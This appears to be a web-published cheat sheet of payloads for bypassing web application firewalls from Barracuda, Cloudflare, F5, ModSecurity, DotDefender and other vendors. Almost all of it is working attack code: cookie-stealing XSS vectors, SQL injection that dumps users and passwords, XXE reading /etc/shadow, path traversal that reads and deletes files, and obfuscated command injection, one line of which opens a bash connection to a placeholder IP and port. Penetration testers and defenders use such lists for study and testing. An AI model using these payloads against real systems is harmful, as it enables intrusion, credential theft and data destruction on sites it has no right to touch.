+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">GET &#x2F;cgi-mod&#x2F;index.cgi?&amp;primary_tab&#x3D;ADVANCED&amp;secondary_tab&#x3D;test_backup_server&amp;content_only&#x3D;1&amp;&amp;&amp;backup_port&#x3D;21&amp;&amp;backup_username&#x3D;%3E%22%3Ciframe%20src%3Dhttp%3A&#x2F;&#x2F;www.example.net&#x2F;etc&#x2F;bad-example.exe%3E&amp;&amp;backup_type&#x3D;ftp&amp;&amp;backup_life&#x3D;5&amp;&amp;backup_server&#x3D;%3E%22%3Ciframe%20src%3Dhttp%3A&#x2F;&#x2F;www.example.net&#x2F;etc&#x2F;bad-example.exe%3E&amp;&amp;backup_path&#x3D;%3E%22%3Ciframe%20src%3Dhttp%3A&#x2F;&#x2F;www.example.net&#x2F;etc&#x2F;bad-example.exe%3E&amp;&amp;backup_password&#x3D;%3E%22%3Ciframe%20src%3Dhttp%3A&#x2F;&#x2F;www.example.net%20width%3D800%20height%3D800%3E&amp;&amp;user&#x3D;guest&amp;&amp;password&#x3D;121c34d4e85dfe6758f31ce2d7b763e7&amp;&amp;et&#x3D;1261217792&amp;&amp;locale&#x3D;en_US</span><br><span class="line">Host: favoritewaf.com</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (compatible; MSIE5.01; Windows NT)</span><br></pre></td></tr></table></figure>
+
+<p>XSS Bypass by @0xInfection</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href&#x3D;j%0Aa%0Av%0Aa%0As%0Ac%0Ar%0Ai%0Ap%0At:open()&gt;clickhere</span><br><span class="line">Barracuda WAF 8.0.1 - Remote Command Execution (Metasploit) by @xort</span><br></pre></td></tr></table></figure>
+
+<p>Barracuda Spam &amp; Virus Firewall 5.1.3 - Remote Command Execution (Metasploit) by @xort</p>
+<h3 id="Cerber-WordPress"><a href="#Cerber-WordPress" class="headerlink" title="Cerber (WordPress)"></a><strong>Cerber (WordPress)</strong></h3><p>Username Enumeration Protection Bypass by HTTP Verb Tampering by @ed0x21son</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">POST host.com HTTP&#x2F;1.1</span><br><span class="line">Host: favoritewaf.com</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (compatible; MSIE5.01; Windows NT)</span><br><span class="line"></span><br><span class="line">author&#x3D;1</span><br></pre></td></tr></table></figure>
+
+<p>Protected Admin Scripts Bypass by @ed0x21son</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;host&#x2F;wp-admin&#x2F;&#x2F;&#x2F;load-scripts.php?load%5B%5D&#x3D;jquery-core,jquery-migrate,utils</span><br><span class="line">http:&#x2F;&#x2F;host&#x2F;wp-admin&#x2F;&#x2F;&#x2F;load-styles.php?load%5B%5D&#x3D;dashicons,admin-bar</span><br></pre></td></tr></table></figure>
+
+<p>REST API Disable Bypass by @ed0x21son</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;host&#x2F;index.php&#x2F;wp-json&#x2F;wp&#x2F;v2&#x2F;users&#x2F;</span><br></pre></td></tr></table></figure>
+
+<h3 id="Citrix-NetScaler"><a href="#Citrix-NetScaler" class="headerlink" title="Citrix NetScaler"></a><strong>Citrix NetScaler</strong></h3><p>SQLi via HTTP Parameter Pollution (NS10.5) by @BGA Security</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;soapenv:Envelope xmlns:soapenv&#x3D;&quot;http:&#x2F;&#x2F;schemas.xmlsoap.org&#x2F;soap&#x2F;envelope&#x2F;&quot; xmlns:tem&#x3D;&quot;http:&#x2F;&#x2F;tempuri.org&#x2F;&quot;&gt;</span><br><span class="line">   &lt;soapenv:Header&#x2F;&gt;</span><br><span class="line">   &lt;soapenv:Body&gt;</span><br><span class="line">        &lt;string&gt;’ union select current_user, 2#&lt;&#x2F;string&gt;</span><br><span class="line">    &lt;&#x2F;soapenv:Body&gt;</span><br><span class="line">&lt;&#x2F;soapenv:Envelope&gt;</span><br><span class="line">generic_api_call.pl XSS by @NNPoster</span><br><span class="line">http:&#x2F;&#x2F;host&#x2F;ws&#x2F;generic_api_call.pl?function&#x3D;statns&amp;standalone&#x3D;%3c&#x2F;script%3e%3cscript%3ealert(document.cookie)%3c&#x2F;script%3e%3cscript%3e</span><br></pre></td></tr></table></figure>
+
+
+
+<p>```<strong>Cloudflare</strong>`</p>
+<p>HTML Injection by @spyerror</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;div style&#x3D;&quot;background:url(&#x2F;f#&amp;#127;oo&#x2F;;color:red&#x2F;*&#x2F;foo.jpg);&quot;&gt;X</span><br></pre></td></tr></table></figure>
+
+<p>XSS Bypass by @c0d3g33k</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a+HREF&#x3D;&#39;javascrip%26%239t:alert%26lpar;document.domain)&#39;&gt;test&lt;&#x2F;a&gt;</span><br></pre></td></tr></table></figure>
+
+<p>XSS Bypasses by @Bohdan Korzhynskyi</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg onload&#x3D;prompt%26%230000000040document.domain)&gt;</span><br><span class="line">&lt;svg onload&#x3D;prompt%26%23x000000028;document.domain)&gt;</span><br><span class="line">xss&#39;&quot;&gt;&lt;iframe srcdoc&#x3D;&#39;%26lt;script&gt;;prompt&#96;$&#123;document.domain&#125;&#96;%26lt;&#x2F;script&gt;&#39;&gt;</span><br><span class="line">1&#39;&quot;&gt;&lt;img&#x2F;src&#x2F;onerror&#x3D;.1|alert&#96;&#96;&gt;</span><br></pre></td></tr></table></figure>
+
+<p>XSS Bypass by @RakeshMane10</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg&#x2F;onload&#x3D;&amp;#97&amp;#108&amp;#101&amp;#114&amp;#00116&amp;#40&amp;#41&amp;#x2f&amp;#x2f</span><br></pre></td></tr></table></figure>
+
+<p>XSS Bypass by @ArbazKiraak</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href&#x3D;&quot;j&amp;Tab;a&amp;Tab;v&amp;Tab;asc&amp;NewLine;ri&amp;Tab;pt&amp;colon;\u0061\u006C\u0065\u0072\u0074&amp;lpar;this[&#39;document&#39;][&#39;cookie&#39;]&amp;rpar;&quot;&gt;X&lt;&#x2F;a&gt;&#96;</span><br></pre></td></tr></table></figure>
+
+<p>XSS Bypass by @Ahmet Ümit</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;--&#96;&lt;img&#x2F;src&#x3D;&#96; onerror&#x3D;confirm&#96;&#96;&gt; --!&gt;</span><br></pre></td></tr></table></figure>
+
+<p>XSS Bypass by @Shiva Krishna</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javascript:&#123;alert&#96;0&#96;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>XSS Bypass by @Brute Logic</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;base href&#x3D;&#x2F;&#x2F;knoxss.me?</span><br></pre></td></tr></table></figure>
+
+<p>XSS Bypass by @RenwaX23 (Chrome only)</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;j id&#x3D;x style&#x3D;&quot;-webkit-user-modify:read-write&quot; onfocus&#x3D;&#123;window.onerror&#x3D;eval&#125;throw&#x2F;0&#x2F;+name&gt;H&lt;&#x2F;j&gt;#x</span><br></pre></td></tr></table></figure>
+
+<p>RCE Payload Detection Bypass by @theMiddle</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cat$u+&#x2F;etc$u&#x2F;passwd$u</span><br><span class="line">&#x2F;bin$u&#x2F;bash$u &lt;ip&gt; &lt;port&gt;</span><br><span class="line">&quot;;cat+&#x2F;etc&#x2F;passwd+#</span><br></pre></td></tr></table></figure>
+
+<h3 id="Comodo"><a href="#Comodo" class="headerlink" title="Comodo"></a><strong>Comodo</strong></h3><p>XSS Bypass by @0xInfection</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;input&#x2F;oninput&#x3D;&#39;new Function&#96;confir\u006d\&#96;0\&#96;&#96;&#39;&gt;</span><br><span class="line">&lt;p&#x2F;ondragstart&#x3D;%27confirm(0)%27.replace(&#x2F;.+&#x2F;,eval)%20draggable&#x3D;True&gt;dragme</span><br></pre></td></tr></table></figure>
+
+<p>SQLi by @WAFNinja</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0 union&#x2F;**&#x2F;select 1,version(),@@datadir</span><br></pre></td></tr></table></figure>
+
+<h3 id="DotDefender"><a href="#DotDefender" class="headerlink" title="DotDefender"></a>DotDefender</h3><p>Firewall disable by (v5.0) by @hyp3rlinx</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">PGVuYWJsZWQ+ZmFsc2U8L2VuYWJsZWQ+</span><br><span class="line">&lt;enabled&gt;false&lt;&#x2F;enabled&gt;</span><br></pre></td></tr></table></figure>
+
+<p>Remote Command Execution (v3.8-5) by @John Dos</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;dotDefender&#x2F;index.cgi HTTP&#x2F;1.1</span><br><span class="line">Host: 172.16.159.132</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Macintosh; U; Intel Mac OS X 10.6; en-US; rv:1.9.1.5) Gecko&#x2F;20091102 Firefox&#x2F;3.5.5</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,*&#x2F;*;q&#x3D;0.8</span><br><span class="line">Accept-Language: en-us,en;q&#x3D;0.5</span><br><span class="line">Accept-Encoding: gzip,deflate</span><br><span class="line">Accept-Charset: ISO-8859-1,utf-8;q&#x3D;0.7,*;q&#x3D;0.7</span><br><span class="line">Keep-Alive: 300</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Authorization: Basic YWRtaW46</span><br><span class="line">Cache-Control: max-age&#x3D;0</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">Content-Length: 95</span><br><span class="line"></span><br><span class="line">sitename&#x3D;dotdefeater&amp;deletesitename&#x3D;dotdefeater;id;ls -al ..&#x2F;;pwd;&amp;action&#x3D;deletesite&amp;linenum&#x3D;15</span><br></pre></td></tr></table></figure>
+
+<p>Persistent XSS (v4.0) by @EnableSecurity</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">GET &#x2F;c?a&#x3D;&lt;script&gt; HTTP&#x2F;1.1</span><br><span class="line">Host: 172.16.159.132</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Macintosh; U; Intel Mac OS X 10.6; en-US;</span><br><span class="line">rv:1.9.1.5) Gecko&#x2F;20091102 Firefox&#x2F;3.5.5</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,*&#x2F;*;q&#x3D;0.8</span><br><span class="line">Accept-Language: en-us,en;q&#x3D;0.5</span><br><span class="line">Accept-Encoding: gzip,deflate</span><br><span class="line">Accept-Charset: ISO-8859-1,utf-8;q&#x3D;0.7,*;q&#x3D;0.7</span><br><span class="line">&lt;script&gt;alert(1)&lt;&#x2F;script&gt;: aa</span><br><span class="line">Keep-Alive: 300</span><br></pre></td></tr></table></figure>
+
+<p>R-XSS Bypass by @WAFNinja</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg&#x2F;onload&#x3D;prompt(1);&gt;</span><br><span class="line">&lt;isindex action&#x3D;&quot;javas&amp;tab;cript:alert(1)&quot; type&#x3D;image&gt;</span><br><span class="line">&lt;marquee&#x2F;onstart&#x3D;confirm(2)&gt;</span><br></pre></td></tr></table></figure>
+
+<p>XSS Bypass by @0xInfection</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;p draggable&#x3D;True ondragstart&#x3D;prompt()&gt;alert</span><br><span class="line">&lt;bleh&#x2F;ondragstart&#x3D;&amp;Tab;parent&amp;Tab;[&#39;open&#39;]&amp;Tab;&amp;lpar;&amp;rpar;%20draggable&#x3D;True&gt;dragme</span><br><span class="line">GET - XSS Bypass (v4.02) by @DavidK</span><br><span class="line"></span><br><span class="line">&#x2F;search?q&#x3D;%3Cimg%20src&#x3D;%22WTF%22%20onError&#x3D;alert(&#x2F;0wn3d&#x2F;.source)%20&#x2F;%3E</span><br><span class="line"></span><br><span class="line">&lt;img src&#x3D;&quot;WTF&quot; onError&#x3D;&quot;&#123;var</span><br><span class="line">&#123;3:s,2:h,5:a,0:v,4:n,1:e&#125;&#x3D;&#39;earltv&#39;&#125;[self][0][v%2Ba%2Be%2Bs](e%2Bs%2Bv%2B</span><br><span class="line">h%2Bn)(&#x2F;0wn3d&#x2F;.source)&quot; &#x2F;&gt;</span><br></pre></td></tr></table></figure>
+
+<p>POST - XSS Bypass (v4.02) by @DavidK</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src&#x3D;&quot;WTF&quot; onError&#x3D;&quot;&#123;var</span><br><span class="line">&#123;3:s,2:h,5:a,0:v,4:n,1:e&#125;&#x3D;&#39;earltv&#39;&#125;[self][0][v+a+e+s](e+s+v+h+n)(&#x2F;0wn3d&#x2F;</span><br><span class="line">.source)&quot; &#x2F;&gt;</span><br><span class="line">clave XSS (v4.02) by @DavidK</span><br><span class="line">&#x2F;?&amp;idPais&#x3D;3&amp;clave&#x3D;%3Cimg%20src&#x3D;%22WTF%22%20onError&#x3D;%22&#123;</span><br></pre></td></tr></table></figure>
+
+<h3 id="Fortinet-Fortiweb"><a href="#Fortinet-Fortiweb" class="headerlink" title="Fortinet Fortiweb"></a><strong>Fortinet Fortiweb</strong></h3><p><code>pcre_expression</code> unvaidated XSS by @Benjamin Mejri</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;waf&#x2F;pcre_expression&#x2F;validate?redir&#x3D;&#x2F;success&amp;mkey&#x3D;0%22%3E%3Ciframe%20src&#x3D;http:&#x2F;&#x2F;vuln-lab.com%20onload&#x3D;alert%28%22VL%22%29%20%3C</span><br><span class="line">&#x2F;waf&#x2F;pcre_expression&#x2F;validate?redir&#x3D;&#x2F;success%20%22%3E%3Ciframe%20src&#x3D;http:&#x2F;&#x2F;vuln-lab.com%20onload&#x3D;alert%28%22VL%22%29%20%3C&amp;mkey&#x3D;0</span><br></pre></td></tr></table></figure>
+
+<p>CSP Bypass by @Binar10</p>
+<p>POST Type Query</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;&lt;path&gt;&#x2F;login-app.aspx HTTP&#x2F;1.1</span><br><span class="line">Host: &lt;host&gt;</span><br><span class="line">User-Agent: &lt;any valid user agent string&gt;</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">Content-Length: &lt;the content length must be at least 2399 bytes&gt;</span><br><span class="line"></span><br><span class="line">var1&#x3D;datavar1&amp;var2&#x3D;datavar12&amp;pad&#x3D;&lt;random data to complete at least 2399 bytes&gt;</span><br></pre></td></tr></table></figure>
+
+<p>GET Type Query</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;&lt;domain&gt;&#x2F;path?var1&#x3D;vardata1&amp;var2&#x3D;vardata2&amp;pad&#x3D;&lt;large arbitrary data&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="F5-ASM"><a href="#F5-ASM" class="headerlink" title="F5 ASM"></a><strong>F5 ASM</strong></h3><p>XSS Bypass by @WAFNinja</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;table background&#x3D;&quot;javascript:alert(1)&quot;&gt;&lt;&#x2F;table&gt;</span><br><span class="line">&quot;&#x2F;&gt;&lt;marquee onfinish&#x3D;confirm(123)&gt;a&lt;&#x2F;marquee&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="F5-BIG-IP"><a href="#F5-BIG-IP" class="headerlink" title="F5 BIG-IP"></a><strong>F5 BIG-IP</strong></h3><p>XSS Bypass by @WAFNinja</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;body style&#x3D;&quot;height:1000px&quot; onwheel&#x3D;&quot;[DATA]&quot;&gt;</span><br><span class="line">&lt;div contextmenu&#x3D;&quot;xss&quot;&gt;Right-Click Here&lt;menu id&#x3D;&quot;xss&quot; onshow&#x3D;&quot;[DATA]&quot;&gt;</span><br><span class="line">&lt;body style&#x3D;&quot;height:1000px&quot; onwheel&#x3D;&quot;prom%25%32%33%25%32%36x70;t(1)&quot;&gt;</span><br><span class="line">&lt;div contextmenu&#x3D;&quot;xss&quot;&gt;Right-Click Here&lt;menu id&#x3D;&quot;xss&quot; onshow&#x3D;&quot;prom%25%32%33%25%32%36x70;t(1)&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<p>XSS Bypass by @Aatif Khan</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;body style&#x3D;&quot;height:1000px&quot; onwheel&#x3D;&quot;prom%25%32%33%25%32%36x70;t(1)&quot;&gt;</span><br><span class="line">&lt;div contextmenu&#x3D;&quot;xss&quot;&gt;Right-Click Here&lt;menu id&#x3D;&quot;xss&quot;onshow&#x3D;&quot;prom%25%32%33%25%32%36x70;t(1)“&gt;</span><br></pre></td></tr></table></figure>
+
+<p><code>report_type</code> XSS by @NNPoster</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;host&#x2F;dms&#x2F;policy&#x2F;rep_request.php?report_type&#x3D;%22%3E%3Cbody+onload&#x3D;alert(%26quot%3BXSS%26quot%3B)%3E%3Cfoo+</span><br></pre></td></tr></table></figure>
+
+<p>POST Based XXE by @Anonymous</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;sam&#x2F;admin&#x2F;vpe2&#x2F;public&#x2F;php&#x2F;server.php HTTP&#x2F;1.1</span><br><span class="line">Host: bigip</span><br><span class="line">Cookie: BIGIPAuthCookie&#x3D;*VALID_COOKIE*</span><br><span class="line">Content-Length: 143</span><br><span class="line"></span><br><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&#39;utf-8&#39; ?&gt;</span><br><span class="line">&lt;!DOCTYPE a [&lt;!ENTITY e SYSTEM &#39;&#x2F;etc&#x2F;shadow&#39;&gt; ]&gt;</span><br><span class="line">&lt;message&gt;&lt;dialogueType&gt;&amp;e;&lt;&#x2F;dialogueType&gt;&lt;&#x2F;message&gt;</span><br></pre></td></tr></table></figure>
+
+<p>Directory Traversal by @Anastasios Monachos</p>
+<p>Read Arbitrary File</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;tmui&#x2F;Control&#x2F;jspmap&#x2F;tmui&#x2F;system&#x2F;archive&#x2F;properties.jsp?&amp;name&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd</span><br><span class="line">Delete Arbitrary File</span><br><span class="line">POST &#x2F;tmui&#x2F;Control&#x2F;form HTTP&#x2F;1.1</span><br><span class="line">Host: site.com</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Macintosh; Intel Mac OS X 10.9; rv:32.0) Gecko&#x2F;20100101 Firefox&#x2F;32.0</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,*&#x2F;*;q&#x3D;0.8</span><br><span class="line">Accept-Language: en-US,en;q&#x3D;0.5</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Cookie: JSESSIONID&#x3D;6C6BADBEFB32C36CDE7A59C416659494; f5advanceddisplay&#x3D;&quot;&quot;; BIGIPAuthCookie&#x3D;89C1E3BDA86BDF9E0D64AB60417979CA1D9BE1D4; BIGIPAuthUsernameCookie&#x3D;admin; F5_CURRENT_PARTITION&#x3D;Common; f5formpage&#x3D;&quot;&#x2F;tmui&#x2F;system&#x2F;archive&#x2F;properties.jsp?&amp;name&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd&quot;; f5currenttab&#x3D;&quot;main&quot;; f5mainmenuopenlist&#x3D;&quot;&quot;; f5_refreshpage&#x3D;&#x2F;tmui&#x2F;Control&#x2F;jspmap&#x2F;tmui&#x2F;system&#x2F;archive&#x2F;properties.jsp%3Fname%3D..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">_form_holder_opener_&#x3D;&amp;handler&#x3D;%2Ftmui%2Fsystem%2Farchive%2Fproperties&amp;handler_before&#x3D;%2Ftmui%2Fsystem%2Farchive%2Fproperties&amp;showObjList&#x3D;&amp;showObjList_before&#x3D;&amp;hideObjList&#x3D;&amp;hideObjList_before&#x3D;&amp;enableObjList&#x3D;&amp;enableObjList_before&#x3D;&amp;disableObjList&#x3D;&amp;disableObjList_before&#x3D;&amp;_bufvalue&#x3D;icHjvahr354NZKtgQXl5yh2b&amp;_bufvalue_before&#x3D;icHjvahr354NZKtgQXl5yh2b&amp;_bufvalue_validation&#x3D;NO_VALIDATION&amp;com.f5.util.LinkedAdd.action_override&#x3D;%2Ftmui%2Fsystem%2Farchive%2Fproperties&amp;com.f5.util.LinkedAdd.action_override_before&#x3D;%2Ftmui%2Fsystem%2Farchive%2Fproperties&amp;linked_add_id&#x3D;&amp;linked_add_id_before&#x3D;&amp;name&#x3D;..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&amp;name_before&#x3D;..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&amp;form_page&#x3D;%2Ftmui%2Fsystem%2Farchive%2Fproperties.jsp%3F&amp;form_page_before&#x3D;%2Ftmui%2Fsystem%2Farchive%2Fproperties.jsp%3F&amp;download_before&#x3D;Download%3A+..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&amp;restore_before&#x3D;Restore&amp;delete&#x3D;Delete&amp;delete_before&#x3D;Delete</span><br></pre></td></tr></table></figure>
+
+<h3 id="F5-FirePass"><a href="#F5-FirePass" class="headerlink" title="F5 FirePass"></a><strong>F5 FirePass</strong></h3><p>SQLi Bypass from @Anonymous</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">state&#x3D;%2527+and+</span><br><span class="line">(case+when+SUBSTRING(LOAD_FILE(%2527&#x2F;etc&#x2F;passwd%2527),1,1)&#x3D;char(114)+then+</span><br><span class="line">BENCHMARK(40000000,ENCODE(%2527hello%2527,%2527batman%2527))+else+0+end)&#x3D;0+--+</span><br></pre></td></tr></table></figure>
+
+<h3 id="ModSecurity"><a href="#ModSecurity" class="headerlink" title="ModSecurity"></a><strong>ModSecurity</strong></h3><p>RCE Payloads Detection Bypass for PL3 by @theMiddle (v3.1)</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">;+$u+cat+&#x2F;etc$u&#x2F;passwd$u</span><br></pre></td></tr></table></figure>
+
+<p>RCE Payloads Detection Bypass for PL2 by @theMiddle (v3.1)</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">;+$u+cat+&#x2F;etc$u&#x2F;passwd+\#</span><br></pre></td></tr></table></figure>
+
+<p>RCE Payloads for PL1 and PL2 by @theMiddle (v3.0)</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;???&#x2F;??t+&#x2F;???&#x2F;??ss??</span><br></pre></td></tr></table></figure>
+
+<p>RCE Payloads for PL3 by @theMiddle (v3.0)</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;?in&#x2F;cat+&#x2F;et?&#x2F;passw?</span><br></pre></td></tr></table></figure>
+
+<p>SQLi Bypass by @Johannes Dahse (v2.2)</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0+div+1+union%23foo*%2F*bar%0D%0Aselect%23foo%0D%0A1%2C2%2Ccurrent_user</span><br></pre></td></tr></table></figure>
+
+<p>SQLi Bypass by @Yuri Goltsev (v2.2)</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 AND (select DCount(last(username)&amp;after&#x3D;1&amp;after&#x3D;1) from users where username&#x3D;&#39;ad1min&#39;)</span><br></pre></td></tr></table></figure>
+
+<p>SQLi Bypass by @Ahmad Maulana (v2.2)</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1&#39;UNION&#x2F;*!0SELECT user,2,3,4,5,6,7,8,9&#x2F;*!0from&#x2F;*!0mysql.user&#x2F;*-</span><br><span class="line">SQLi Bypass by @Travis Lee (v2.2)</span><br><span class="line">amUserId&#x3D;1 union select username,password,3,4 from users</span><br></pre></td></tr></table></figure>
+
+<p>SQLi Bypass by @Roberto Salgado (v2.2)</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%0Aselect%200x00,%200x41%20like&#x2F;*!31337table_name*&#x2F;,3%20from%20information_schema.tables%20limit%201</span><br></pre></td></tr></table></figure>
+
+<p>SQLi Bypass by @Georgi Geshev (v2.2)</p>
